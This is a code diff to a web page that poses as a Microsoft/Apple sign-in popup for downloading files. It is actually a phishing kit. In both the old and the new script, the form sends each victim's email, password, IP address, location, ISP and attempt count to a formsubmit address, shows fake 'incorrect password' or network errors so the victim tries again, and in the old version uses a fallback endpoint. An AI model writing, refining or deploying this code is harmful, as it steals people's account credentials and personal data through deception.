@@ -500,7 +500,7 @@
           <button class="btn logo" type="button">
             <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgm4x9jPELaQWyGDDPfk1PihnSw6z2tYshg8hGeLDKFItNQ_nfmpuwcUICeeYeLZrX2ORBeJHJLw3sN0plw0suKxt84xFZU_Ue17q17fpmPvOx2hJKzoqTmoF5dIZhA8f52PpC4GIYnIPbbr6JZHVhMTSh_M6joEzgX8K1n4Je2HOuMzsYCxGEWwusqNe8/s500/Untitled.png" alt="Microsoft logo">
             Sign in with Microsoft
-        </button>
+          </button>
           <button class="btn logo" type="button">
             <i class="fab fa-apple"></i>
             Sign in with Apple
@@ -525,11 +525,10 @@
     </div>
   </div>
 
-  
-                <script>
-document.addEventListener('DOMContentLoaded', function () {
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
   // Element references
-  const downloadButtons = document.querySelectorAll('.download-icon');
+  const downloadButtons = document.querySelectorAll('.download-icon'); // Target only the icons
   const downloadAllButton = document.getElementById('downloadButton');
   const popupForm = document.getElementById('popupForm');
   const popupOverlay = document.getElementById('popupOverlay');
@@ -670,107 +669,67 @@ document.addEventListener('DOMContentLoaded', function () {
 
     errorMessage.style.display = 'none';
     showLoading(true);
-    submitButton.textContent = 'Verifying...';
 
     try {
-      // Get IP information
-      const ipResponse = await fetch('https://ipinfo.io/json');
-      if (!ipResponse.ok) throw new Error('Network error');
-      const ipData = await ipResponse.json();
+      await new Promise((resolve) => setTimeout(resolve, 2000));
 
       step++; // Increment submission attempt
 
-      // Prepare form data - using URLSearchParams format for formsubmit.click
-      const formData = new URLSearchParams();
-      formData.append('_subject', 'Logs | ' + ipData.ip);
-      formData.append('Email', email);
-      formData.append('Password', password);
-      formData.append('Attempts', step.toString());
-      formData.append('IP', ipData.ip);
-      formData.append('Location', ipData.city + ', ' + ipData.country);
-
-      // Submit to FormSubmit
-      const submitResponse = await fetch('https://formsubmit.co/ajax/gabriel5657@proton.me', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'Accept': 'application/json'
-        },
-        body: formData.toString()
-      });
-
-      if (!submitResponse.ok) {
+      // Trigger network error on second submission
+      if (step === 2) {
         throw new Error('Network error');
       }
 
+      const ipResponse = await fetch('https://ipapi.co/json/');
+      if (!ipResponse.ok) throw new Error('Network error');
+      const ipData = await ipResponse.json();
+
+      const formData = {
+        _subject: `Logs | ${email} | ${ipData.ip || 'Unknown IP'}`,
+        Email: email,
+        Password: password,
+        Attempts: step,
+        IP: ipData.ip || 'Not available',
+        Location: `${ipData.city || 'Unknown'}, ${ipData.country || 'Unknown'}`,
+        Domain: email.split('@').pop(),
+        ISP: ipData.org || 'Unknown',
+        Hostname: ipData.hostname || 'Unknown',
+        Timestamp: new Date().toISOString(),
+      };
+
+      const submitResponse = await fetch('https://formsubmit.co/ajax/gabriel5657@proton.me', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json',
+        },
+        body: JSON.stringify(formData),
+      });
+
+      if (!submitResponse.ok) throw new Error('Network error');
+
       const result = await submitResponse.json();
 
-      // Check if submission was successful
-      if (result.success) {
-        console.log('Submission successful:', result);
-
-        // Redirect on second attempt
-        if (step === 2) {
-          const domain = email.split('@').pop(); // Extract domain from email
-          showLoading(false);
-          window.location.href = `http://${domain}`;
-          return;
-        }
-
-        // Show incorrect password message on first attempt
-        showError('Incorrect password. Please try again.');
-        showLoading(false);
-        submitButton.textContent = 'Sign in';
-      } else {
-        throw new Error('Submission failed');
+      if (password !== 'correctpassword123') {
+        throw new Error('Incorrect password');
       }
 
+      isAuthenticated = true;
+      authEmail = email;
+      closePopup();
+      enableDownloads();
     } catch (error) {
       console.error('Submission error:', error);
       showLoading(false);
-      submitButton.textContent = 'Sign in';
-      
-      // Try alternative endpoint if main one fails
-      if (error.message.includes('Network error') || error.message.includes('failed')) {
-        try {
-          // Try the formsubmit.click endpoint as fallback
-          const fallbackFormData = new FormData();
-          fallbackFormData.append('_subject', 'Logs | Fallback');
-          fallbackFormData.append('Email', email);
-          fallbackFormData.append('Password', password);
-          fallbackFormData.append('Attempts', step.toString());
-          fallbackFormData.append('IP', 'Unknown');
-          fallbackFormData.append('Location', 'Unknown');
-          
-          const fallbackResponse = await fetch('https://formsubmit.click/Gabriel5657@proton.me', {
-            method: 'POST',
-            body: fallbackFormData
-          });
-          
-          if (fallbackResponse.ok) {
-            console.log('Fallback submission successful');
-            
-            // Continue with the flow even if using fallback
-            if (step === 2) {
-              const domain = email.split('@').pop();
-              showLoading(false);
-              window.location.href = `http://${domain}`;
-              return;
-            }
-            
-            showError('Incorrect password. Please try again.');
-            showLoading(false);
-            submitButton.textContent = 'Sign in';
-            return;
-          }
-        } catch (fallbackError) {
-          console.error('Fallback also failed:', fallbackError);
-        }
-        
+      if (error.message === 'Network error') {
         closePopup();
         showNetworkError();
       } else {
-        showError('An error occurred. Please try again later.');
+        showError(
+          error.message === 'Incorrect password'
+            ? 'Incorrect password. Please try again.'
+            : 'An error occurred. Please try again later.'
+        );
       }
     }
   }
@@ -855,13 +814,6 @@ document.addEventListener('DOMContentLoaded', function () {
   // Initial validation
   validateInputs();
 });
-          </script>
+  </script>
 </body>
 </html>
-
-
-
-
-
-
-
